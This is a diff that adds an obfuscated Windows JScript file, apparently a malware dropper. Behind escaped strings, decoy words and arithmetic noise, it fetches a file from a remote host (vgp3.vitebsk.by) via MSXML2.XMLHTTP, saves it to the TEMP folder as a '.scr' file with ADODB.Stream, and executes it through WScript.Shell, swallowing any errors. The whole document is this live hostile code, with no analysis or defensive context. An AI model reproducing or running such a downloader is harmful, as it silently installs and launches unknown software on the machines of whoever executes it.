@@ -1,0 +1,24 @@
+budgetGround = (((234 - 67) ^ (14 - 1)), this);
+shortsInformation = ("\u0052\u0075n");
+copyApproximation = budgetGround[("\u0073o\u0063\u0069\u0061\u006c", "morgue", "a\u006dor\u0070ho\u0075s", "a\u006et\u0065\u006e\u006ea", "W\u0053\u0063\u0072\u0069\u0070\u0074")];
+copyApproximation[("\u0063o\u006c\u006f\u0073s\u0061l", "Sleep")](((([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1) * ([!+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1)) / (Math.pow(57, 2) - 3221)));
+organizationResidence = copyApproximation[("\u006d\u0065\u0072i\u0064i\u0061\u006e", "\u0043\u0072\u0065a\u0074\u0065\u004f\u0062\u006ae\u0063t")](("t\u0068e\u006fr\u0065\u0074\u0069c", "\u006d\u0069\u006e\u0075s", "iden\u0074ic\u0061l", "\u0057\u0053cr\u0069\u0070\u0074\u002eSh\u0065ll"));
+audienceMirage = organizationResidence[("\u0061\u0074\u0074ribu\u0074e", "r\u0061dical", "\u0070\u006f\u0072t", "\u0045xp\u0061ndE\u006e\u0076\u0069ro\u006em\u0065\u006et\u0053\u0074ri\u006e\u0067\u0073")](("\u006cimi\u0074", "au\u0074o\u006da\u0074\u0069c", "\u0025TEMP\u0025\u002f")) + ("\u0076\u0061ri\u0061t\u0069on", "\u0070ar\u0069\u0074yMin\u0075\u0074\u0065") + ("i\u006edex", "\u006coc\u0061tio\u006e", "combi\u006e\u0061\u0074i\u006f\u006e", function String.prototype.examinationMask() {
+	return this
+}, "t\u0065\u0072m\u0069no\u006cog\u0079", "\u002e\u0073cr");
+artistInitial = budgetGround[("\u0073u\u0066\u0066i\u0078", "\u0057\u0053\u0063r\u0069\u0070\u0074")][("apos\u0074\u0072o\u0070he", "C\u0072\u0065\u0061\u0074e\u004f\u0062j\u0065\u0063\u0074")](("MSX\u004dL2\u002e\u0058M\u004c\u0048T\u0054P"));
+artistInitial[("\u0073p\u006f\u006e\u0073\u006fr", "\u006ded\u0069c\u0061\u006c", "\u0064\u0069\u0070l\u006fm\u0061", "ope\u006e")](("\u007a\u006fn\u0065", "gram", "\u0062\u0061\u0072", "\u006c\u006f\u0072\u0064", "GET"), ("c\u006ca\u006e", "\u0062\u006c\u006f\u0063\u006ba\u0064\u0065", "mee\u0074\u0069n\u0067", "\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0076gp3\u002e\u0076itebsk\u002eby/\u0036/\u0039\u0038\u0079h\u0038b\u0062"), !(((((35 & 58) / (24 / 12)) * ((3 & 3)), (((28 / 28) | (Math.pow(9, 2) - 65)) | ((9 ^ 30) + (149 - 56))), (((8 | 25) * (69, 21, 135) + (207 / 23)) / ((Math.pow(162, 2) - 26009) / 5)), ((80 / 40) * (2 ^ 0) * (64 - 53) & (22 - 19) * 3 * 3 * (199, 2))), ((((75 - 59) ^ (([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1))) ^ (Math.pow(2 * 11, (1 * 2)) - (168 * 2 + 142))) - ((([!+[] + !+[]] * [!+[] + !+[] + !+[]] - (30 / 30)) * (((([+!+[]])) + "" + (([!+[] + !+[] + !+[]])))) * ([!+[] + !+[]])) - ((43 ^ 125) - (0 | 9))))) == 9));
+artistInitial[("bu\u0074\u0074\u0065\u0072\u0066\u006cy", "re\u0073\u0065\u0072\u0076oi\u0072", "\u0076\u0061c\u0061nt", "se\u006ed")]();
+while (artistInitial[("bil\u006c\u0069o\u006e", "\u0074rib\u0075n\u0065", "nat\u0075r\u0065", "f\u006c\u0061\u0067", "\u0072ea\u0064\u0079s\u0074\u0061te")] < (([!+[] + !+[]]) * ([!+[] + !+[]]))) {
+	budgetGround[("\u0065\u0063h\u006f", "\u0063\u0079c\u006c\u006f\u006e\u0065", "synt\u0068\u0065s\u0069\u0073", "\u0057\u0053cr\u0069p\u0074")][("Sl\u0065\u0065\u0070")](((4 + 0) | (68, 1, 37, 96)));
+}
+campaignInjection = budgetGround[("c\u006f\u006f\u0072\u0064\u0069n\u0061ti\u006fn", "\u0063\u0061f\u0065", "\u0073peci\u0066ic", "\u006c\u0061\u0064y", "\u0057\u0053\u0063\u0072ipt")][("\u0073\u0079n\u006f\u006ey\u006d", "m\u0061ssiv\u0065", "b\u006fom", "fig\u0075re", "C\u0072\u0065\u0061te\u004f\u0062\u006aect")](("\u0073\u0074imu\u006c\u0075s", "di\u0073tance", "\u0041DOD\u0042.\u0053\u0074\u0072e\u0061\u006d"));
+try {
+	campaignInjection[("barbarian", "a\u0073\u0074\u0072\u006f\u006e\u0061u\u0074", "i\u006ed\u0065\u0078", "a\u0075\u0074om\u0061t\u0069c", "o\u0070en")]();
+	campaignInjection[("t\u0079\u0070e")] = ((Math.pow(10, 2) - 90) / (10 & 11));
+	campaignInjection[("cit\u0061tion", "\u0072\u006f\u0062\u006f\u0074", "w\u0072\u0069\u0074e")](artistInitial[("Res\u0070on\u0073eB\u006f\u0064y")]);
+	campaignInjection[("\u0070\u0068\u0061s\u0065", "a\u0073s\u0065\u006dbl\u0079", "p\u006f\u0073i\u0074\u0069\u006fn")] = ((3320 / 20), (Math.pow(127, 2) - 16058), (46 - 46));
+	campaignInjection[("\u0066\u006fr\u0075\u006d", "d\u006f\u006cl\u0061r", "a\u0067\u0067\u0072e\u0067ate", "i\u006es\u0070\u0065c\u0074\u006fr", "save\u0054\u006fFil\u0065")](audienceMirage, ((([!+[] + !+[]]))));
+	campaignInjection[("\u0063ip\u0068\u0065r", "\u0063\u006cos\u0065")]();
+	organizationResidence[shortsInformation](audienceMirage.examinationMask(), ((44 + 19), (1 & 0)), ((0 | 0) / (Math.pow(39, 2) - 1485)));
+} catch (bomberStrategic) {};
